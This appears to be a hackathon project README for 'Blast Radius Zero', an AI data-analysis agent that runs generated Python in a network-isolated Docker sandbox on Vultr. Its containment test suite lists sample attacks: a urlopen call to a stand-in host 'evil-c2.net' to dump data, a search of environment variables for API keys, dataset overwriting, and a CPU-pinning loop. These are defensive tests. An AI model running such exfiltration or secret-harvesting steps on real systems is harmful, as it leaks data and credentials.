# 🛡️ Blast Radius Zero — Sandboxed AI Data Analyst with Receipts

> **Agent Rush Hackathon 2026** — *Challenge 1: Blast Radius Zero*  
> Built for **Vultr Cloud Compute** & **Vultr Serverless Inference**.  
> *"An agent that only chats is a demo; an agent that executes safely is a product."*

---

## ⚡ Executive Summary

AI code-generation agents pose severe security liabilities when allowed to execute arbitrary scripts on production host machines. A single malicious or hallucinated script can exfiltrate customer credentials, wipe file systems, or participate in DDoS attacks.

**Blast Radius Zero** is an autonomous data analytics agent that writes, verifies, and executes Python data analysis pipelines inside an ephemeral, hardened Docker sandbox hosted on **Vultr Cloud Compute**. Powered by **Vultr Serverless Inference**, the agent turns raw CSV files into concrete numbers, tables, and high-resolution charts, while enforcing absolute containment guarantees:
- 🚫 **Zero Network Egress** (`--network none`) — zero bytes leaked.
- 🔑 **Zero Secrets Injection** — host API keys and tokens are strictly scrubbed.
- 🔒 **Read-Only Data Mounts** (`:ro`) — source datasets cannot be modified or ransomware-encrypted.
- ⏱️ **Enforced Resource Caps** — strict CPU (1.0 core), memory (256MB), and execution time (15s) limits.
- 🔄 **Autonomous Self-Healing Loop** — runtime errors or tracebacks are automatically fed back to Vultr Serverless Inference to correct and re-execute.
- 🧾 **Deterministic Receipts** — every computation returns executed standard output and visual artifacts, not conversational guesswork.

---

## 🏗️ System Architecture on Vultr

The entire lifecycle is orchestrated directly on **Vultr Cloud Compute**, eliminating untrusted third-party intermediaries:

```
┌────────────────────────────────────────────────────────┐
│                      Client Web UI                     │
│      (Interactive Dashboard, Receipts & Attack Sim)    │
└───────────────────────────┬────────────────────────────┘
                            │ HTTPS / REST
                            ▼
┌────────────────────────────────────────────────────────┐
│            Vultr Cloud Compute VM (Ubuntu 24.04)       │
│                                                        │
│  ┌──────────────────────────────────────────────────┐  │
│  │     FastAPI Web Service & Security Orchestrator  │  │
│  │   - Holds Vultr Serverless Inference API Key     │  │
│  │   - Dispatches & tears down throwaway containers │  │
│  │   - Self-healing retry feedback loop             │  │
│  └──────────┬─────────────────────────────▲─────────┘  │
│             │ Prompt                      │ Code       │
│             ▼                             │            │
│  ┌────────────────────────────────────────┴─────────┐  │      ┌─────────────────────────────┐
│  │              Vultr Control Layer                 ├───────►│  Vultr Serverless Inference │
│  └──────────────────────────────────────────────────┘  │      │  api.vultrinference.com/v1  │
│                                                        │      │  (zephyr-7b, llama2-13b)    │
│  ┌──────────────────────────────────────────────────┐  │      └─────────────────────────────┘
│  │          Ephemeral Docker Sandbox Container      │  │
│  │   - Non-root user (uid 1000:1000)                │  │
│  │   - Network mode: NONE (isolated from internet)  │  │
│  │   - Memory cap: 256MB | CPU: 1.0 core            │  │
│  │   - Source dataset mounted READ-ONLY (/data:ro)  │  │
│  │   - Scratch output directory (/output:rw)        │  │
│  │   - Destroyed immediately after every task       │  │
│  └──────────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────────┘
```

---

## 🔒 Containment Controls (The 4 Pillars)

| Dimension | Policy | Enforcement Mechanism |
| :--- | :--- | :--- |
| **Network Isolation** | Blast Radius: ZERO | Docker `--network none` container flags. No external DNS or socket egress permitted. |
| **Secret Hygiene** | Zero Leaks | API keys (Vultr, Cloud tokens) reside exclusively in the VM orchestrator environment; **never** exposed to container scope. |
| **Resource Caps** | Anti-DoS Watchdog | Hard limits: `--memory 256m`, `--cpus 1.0`, and execution timeout watchdog (15 seconds) killing runaway processes. |
| **Lifecycle Discipline**| Ephemeral Containers | Every analytical task spawns a fresh container and destroys it upon completion (`--rm`). |

---

## 💥 The "Containment Moment" (Attack Simulation)

In accordance with Hackathon Challenge 1 rules, the application includes a dedicated **Containment Test Suite** accessible with 1-click in the UI or via API (`/api/simulate-attack`):

1. **Network Exfiltration**: Hostile script attempts `urllib.request.urlopen("http://evil-c2.net")` to dump the dataset.
   - *Result*: Blocked immediately by Docker network namespace isolation.
2. **Secret Extraction**: Script traverses environment variables looking for `VULTR_API_KEY` or `TOKEN`.
   - *Result*: Scrubbed environment returns empty / None. Zero secrets exposed.
3. **Host Ransomware / Overwrite**: Script attempts appending malicious bytes to the mounted dataset.
   - *Result*: Blocked with `ReadOnlyFileSystemError`.
4. **Denial of Service (Infinite Loop)**: `while True: pass` designed to pin the CPU.
   - *Result*: Sandboxed watchdog triggers after timeout and terminates the container, preserving host VM responsiveness.

---

## 🚀 Quickstart & Local Development

### Prerequisites
- Python 3.10+
- Node.js (optional)
- Docker (for full container containment)

### 1. Clone & Set Up Environment
```bash
git clone https://github.com/your-username/blast-radius-zero.git
cd blast-radius-zero

# Copy environment variables
cp .env.example .env
```

### 2. Configure Vultr Serverless Inference
Add your Vultr Inference key in `.env`:
```env
VULTR_INFERENCE_API_KEY=your_vultr_key_here
VULTR_INFERENCE_BASE_URL=https://api.vultrinference.com/v1
VULTR_MODEL=zephyr-7b-beta
```

### 3. Install & Run
```bash
pip install -r backend/requirements.txt
python -m uvicorn backend.main:app --host 0.0.0.0 --port 8000 --reload
```
Open [http://localhost:8000](http://localhost:8000) in your browser.

---

## 🚢 1-Click Deployment on Vultr Cloud Compute

Launch a **Cloud Compute VM** on Vultr (Ubuntu 24.04 x64, $10-$20/mo instance using hackathon credits):

```bash
# SSH into your Vultr VM
ssh root@<your_vultr_vm_ip>

# Clone repo & run automated deploy script
git clone https://github.com/your-username/blast-radius-zero.git
cd blast-radius-zero
chmod +x deploy.sh
./deploy.sh
```

The script automatically provisions Docker, builds the isolated sandbox image (`blast-radius-sandbox:latest`), launches the orchestrator behind Nginx/Docker, and binds to Port 80.

---

## 📊 Judging Criteria Alignment

| Criterion | How Blast Radius Zero Delivers |
| :--- | :--- |
| **Application of Technology** | End-to-end integration of Vultr Cloud Compute and Vultr Serverless Inference (`api.vultrinference.com/v1`). Hardened Linux namespaces and cgroups container containment. |
| **Presentation** | High-aesthetic cyber dashboard, live step-by-step pipeline tracking, interactive chart rendering, terminal stdout receipts, and live attack containment testing. |
| **Business Value** | Enables enterprises to safely analyze sensitive financial, health, and server logs using LLMs without fear of data leakage or cloud compute hijacking. |
| **Originality** | Autonomous self-healing execution loop paired with zero-trust containment receipts and verifiable blast radius zero proof. |

---

## 📜 License
MIT License. Built for the **Agent Rush Hackathon (Nov 3–8, 2026)**.
